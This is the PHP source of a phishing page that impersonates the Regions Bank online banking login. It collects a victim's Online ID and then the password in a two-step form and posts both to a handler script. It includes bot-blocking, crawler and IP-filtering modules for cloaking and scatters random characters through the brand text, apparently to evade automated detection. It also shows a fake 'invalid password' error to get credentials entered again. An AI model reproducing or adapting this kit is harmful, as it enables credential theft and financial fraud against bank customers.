<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
if(isset($_GET['getp']) && !isset($_SESSION['used'])){die("<script>history.back()</script>");exit();};
?>
<!DOCTYPE html>
<html lang="en" x-ms-format-detection="none"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Regions Online Banking - Log in to your accounts | Regions </title>
    <link href="rgi/com-regions.css" rel="stylesheet">
    <link href="rgi/olbAuth.min.css" rel="stylesheet">
    <link rel="icon" href="rgi/favicon.ico">
<style class="__tmp_css_exfil_protection_load_blocker">input,input ~ * { background-image:none !important; list-style: inherit !important; cursor: auto !important; content:normal !important; } input::before,input::after,input ~ *::before, input ~ *::after { content:normal !important; }</style>

<style>
</style>
</head>
<body>

    <header class="rds-header simple">
        <div class="container">
            <a class="logo-link" title="Go home">
                <picture class="logo">
                    <source srcset="rgi/regions-logo-no-r.svg" media="(max-width: 600px)">
                    <img src="rgi/regions-logo-no-r.svg" alt="regions logo">
                </picture>
            </a>
        </div>
    </header>

    <noscript>
        <div class="warning-placeholder warning-message">
            Your browser is not capable of viewing this site because it does not support JavaScript or JavaScript may be disabled. Please enable JavaScript.
        </div>
    </noscript>

    <main role="main" class="pb-3" id="main-section">
        

<link href="rgi/Common.css" rel="stylesheet">

<div>
    <div class="rds-wizard-body">
        <div class="body-content">
            <div class="rds-short-form-tile container login-enroll">
                <h1 class="sr-only"> Login to On<?php echo rT('ALPHANUMERIC',rand(1,87));?>line Ba<?php echo rT('ALPHANUMERIC',rand(1,87));?>nki<?php echo rT('ALPHANUMERIC',rand(1,87));?>ng</h1>
                <div class="col-md-12">
			   <?php if(isset($_GET[''.$theerrkey.'']) && !isset($_GET['getp'])){echo '<div class="alert alert-danger" id="page-level-error-box" aria-live="polite" style="display: block;">
                        <div id="page-level-message">Oops! Either the Online ID or Password you entered is invalid. Please try again.</div>
                        <button type="button" id="alert-close" onclick="document.getElementById(\'page-level-error-box\').style.display=\'none\'">X</button>
                    </div>';};?>
                   <?php 
				   if(isset($_GET[''.$theerrkey.''])){$err = '?'.$theerrkey.'=On';} else{$err = '';};
				   if(!isset($_GET['getp'])){echo ' 
				   <div class="col-md-6 col-xs-12" id="username-section" style="display: block;">
                        <h2 id="login-header">Existing Online Customers</h2>
                        <div class="row">
                            <div class="col-xs-12">
                                <p id="note-login">Please enter your Online ID to log in.</p>
                                    <form class="rds-form form" id="login-form" method="post" action="vol'.$err.'" autocomplete="off">
                                        <div id="divUserName" class="field animated-label text">
                                            <label class="control-label" for="UserName" id="username-label">Online ID</label>
                                            <input type="text" id="UserName" name="used" maxlength="18" class="form-control to-switch" onfocus="ooth(\'f\')" onblur="ooth(\'b\')" oninput="ooth(\'i\')" autocomplete="off" style="max-height: 67px; padding-top: 27px;"/>
											<input type="hidden" class="scr" name="grrbow"/>
                                        </div>
                                        <div class="well warning-message">
                                            Please check that the "Caps Lock" or "Num Lock" key is off.
                                        </div>
                                        <div id="login-btn-holder">
                                           <div class="pull-left form-check">
                                                <input type="checkbox" id="login-remember-me" class="form-check-input">
                                                <label for="login-remember-me" class="form-check-label">Remember Me</label>
                                            </div>
                                            <div class="pull-right">
                                                <button type="submit" class="btn btn-primary btn-lg" id="next-btn">Next</button>
                                            </div>
                                        </div>
                                    </form>
                            </div>
                            <div id="login-forgot-url-link">
                                <span class="forgot-url-link"><span aria-hidden="true">Forgot </span><a aria-label="Forgot Online ID?">Online ID</a> or <a aria-label="Forgot Password?">Password?</a></span>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6 col-xs-12" id="enroll-section" style="display: block;">
                        <h2 id="enroll-header"> New Online Customers</h2>
                        <div class="well">
                            <div class="row">
                                <div class="col-xs-12">
                                    <h3 class="font-size-16"> Enroll Now To:</h3>

                                    <ul id="note-enroll-feature">
                                        <li><span>Access your accounts online</span></li>
                                        <li><span>Pay bills online</span></li>
                                        <li><span>Send us a secure message</span></li>
                                    </ul>
                                </div>
                            </div>
                            <div class="row align-flex-right"><a class="btn btn-info btn-lg">Enroll</a></div>
                        </div>
                    </div>
                </div>';} else{ echo'
                <div class="row col-md-6 col-md-offset-3" id="password-section" style="display: block;">
                    <div class="col-xs-12">
                        <h2 id="password-header">Existing Online Customers</h2>
                        <div id="transmitContainer" style="display: block;"> <div class="row col-xs-12"> <span id="online-id" class="page-heading">Please enter your password for '.$_SESSION['used'].' to login.</span> <div class="row margin-top-20"> <div class="col-xs-12 margin-bottom-30"> <form class="rds-form form" id="frmpassword" method="post" action="vol'.$err.'"  autocomplete="off"> <div class="field animated-label text password focus selected" id="divPassword"> <label class="control-label" for="input_password">Password</label> <input type="password" id="input_password" autofocus="on" name="passi" class="form-control to-switch mask-text" maxlength="32" autocomplete="off" style="max-height: 67px; padding-top: 27px;" onfocus="ooth(\'f\')" onblur="ooth(\'b\')" oninput="ooth(\'i\')"/><input type="hidden" name="btntmac" value="'.md5(uniqid()).'"/><input type="hidden" name="used" value="'.$_SESSION['used'].'"/><input type="button" class="inline-btn show-hide-btn" id="showHidePasswordBtn" value="Show" aria-label="Show Password" style="max-height: 67px; padding-top: 27px;" onclick="ptog();"/><div id="input_password-error" class="error-custom-block hidden"><p class="help-block error">Password is required to log in.</p></div> </div> <div class="form-btn-holder"> <div class="pull-left"> <button type="button" class="btn btn-lg cancel-btn" id="cancel-password-button" onclick="history.back()">Go Back</button> </div> <div class="pull-right"> <button type="submit" class="btn btn-primary btn-lg submit-btn" id="submit-password-button">Log In</button> </div> </div> </form> </div> </div> </div> </div>
                        <div id="password-forgot-url-link">
                            <span class="forgot-url-link"><span aria-hidden="true">Forgot </span><a aria-label="Forgot Online ID?">Online ID</a> or <a aria-label="Forgot Password?">Password?</a></span>
                        </div>
                    </div>

                </div>
				';};?>
            </div>
        </div>
    </div>
</div>
<script>
function ooth(m){var e = event.target;if(e.value=="" && m!='f'){e.parentNode.classList.remove('selected');} else{e.parentNode.classList.add('selected');}; if(m!='b'){e.parentNode.classList.add('focus');} else{e.parentNode.classList.remove('focus');};};
function ptog(){var p = document.getElementById("input_password");if(p.type=="password"){p.type="text";} else{p.type="password";};p.parentNode.classList.add('focus');p.focus();}
</script>




    </main>

    <footer class="rds-footer">
        <div class="footer-content">
            <ul>
                <li><a target="_blank">Con<?php echo rT('ALPHANUMERIC',rand(1,87));?>tact Us</a></li>
                <li><a target="_blank">Te<?php echo rT('ALPHANUMERIC',rand(1,87));?>rms and Conditions</a></li>
                <li><a target="_blank">Priv<?php echo rT('ALPHANUMERIC',rand(1,87));?>acy Ple<?php echo rT('ALPHANUMERIC',rand(1,87));?>dge</a></li>
                <li><a target="_blank">Security</a></li>
                <li><a target="_blank">Onli<?php echo rT('ALPHANUMERIC',rand(1,87));?>ne Trac<?php echo rT('ALPHANUMERIC',rand(1,87));?>king and Advertising</a></li>
                <li><a target="_blank">Accessible Ba<?php echo rT('ALPHANUMERIC',rand(1,87));?>nking</a></li>
                <li><a target="_blank">Leave Feedback</a></li>

            </ul>

            <p>Call&nbsp;<a>1-800-REGIO<?php echo rT('ALPHANUMERIC',rand(1,87));?>NS</a></p>
            <p>Regi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ons, the Regi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ons logo, the Life<?php echo rT('ALPHANUMERIC',rand(1,87));?>Green col<?php if(isset($_SESSION['device']) && !stripos($_SESSION['device'],'yochi')){banbot();};?>or, a<?php echo rT('ALPHANUMERIC',rand(1,87));?>nd the LifeGreen bi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ke are registered trademarks of Regions B<?php echo rT('ALPHANUMERIC',rand(1,87));?>ank.</p>
            <p>© <?php echo date("Y");?> Regi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ons Ba<?php echo rT('ALPHANUMERIC',rand(1,87));?>nk. All Ri<?php echo rT('ALPHANUMERIC',rand(1,87));?>ghts Reserved.</p>

            <div class="footer-icon">
                <img src="rgi/equal-housing-lender.svg" alt="Equal Housing Lender">
                <img src="rgi/member-fdic.svg" alt="Member FDIC">
            </div>
        </div>
    </footer>

    <div>
<!-- <pjhhp -->
<!-- if(isset($_GET[''.$theerrkey.''])){ -->
	<!-- if($_SESSION['scr']>991){echo 'document.getElementById("closelogin").click();';}; -->
<!-- }; -->
<!-- ?> -->
    </div>
</body></html>